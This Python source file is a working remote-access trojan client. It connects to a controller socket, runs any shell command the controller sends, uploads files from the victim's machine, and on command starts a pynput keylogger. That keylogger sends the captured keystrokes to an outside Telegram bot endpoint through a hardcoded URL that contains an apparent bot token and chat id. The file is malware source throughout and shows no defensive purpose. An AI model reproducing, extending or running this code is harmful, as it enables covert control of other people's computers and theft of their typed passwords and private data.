#imports and dependencies
from pynput import keyboard
import os, sys, socket, threading, subprocess, json, base64, requests, time

def cmd_send(sock_fd, cmd):  # socket file descrypter is a conn. object and cmd is command data
    cmd = json.dumps(cmd)
    cmd = cmd.encode()
    sock_fd.send(cmd)


def cmd_recv(sock_fd):
    data = ''
    while True:
        data = data + sock_fd.recv(1024).decode()
        # recved cmd in bytes --> decoded it --> and converted into json
        try:
            data = json.loads(data)
            return data
        except:
            continue


def upload(s, filename):
    with open(filename, "rb") as file:
        data = base64.b64encode(file.read())
        cmd_send(s, data.decode())


data = ''
def start_keylogger():
    def log(key):  # capture the keys and append it into data
        global data
        data = data + '['+str(key)+']'
    def send_log():
        # we need to run this func also at the same time with log, so need to use multithreading.
        # what this func do is wait for 10 sec and send whatever in data is and then empty the data again
        while True:
            global data
            time.sleep(5)
            if data != '':
                url = f"https://api.telegram.org/bot5818555834:AAF61oPhhWUcmdNtW72mqIk3_vqgvpg2Kp4/sendMessage?chat_id=921245059&text={data}"
                requests.get(url)
            data = ''

    log_thread = threading.Thread(target=send_log)
    log_thread.start()
    listner = keyboard.Listener(on_press=log)
    with listner:
        listner.join()


def main():
    HOST = "127.0.0.1"  # IP address
    PORT = 1234  # Port no. to connect with
    s = socket.socket()
    s.connect((HOST, PORT))
    print("[+] Connection established...")
    while True:
        cmd = cmd_recv(s)
        if cmd[:8] == 'download':
            upload(s, cmd[9:])
            continue
        if cmd[:9] == 'keylogger':
            key_thread = threading.Thread(target=start_keylogger)
            key_thread.start()
            continue
        # cmd = s.recv(3).decode() #using cmd_recv function instead of this
        res = subprocess.check_output(cmd, shell=True)
        # s.send(res) #no need to encode this because subprocess already gives output in bytes
        cmd_send(s, res.decode())


main()  # calling main function

"""
out = subprocess.Popen("title set_title",shell=True)
out = subprocess.Popen("color 0a",shell=True)
"""
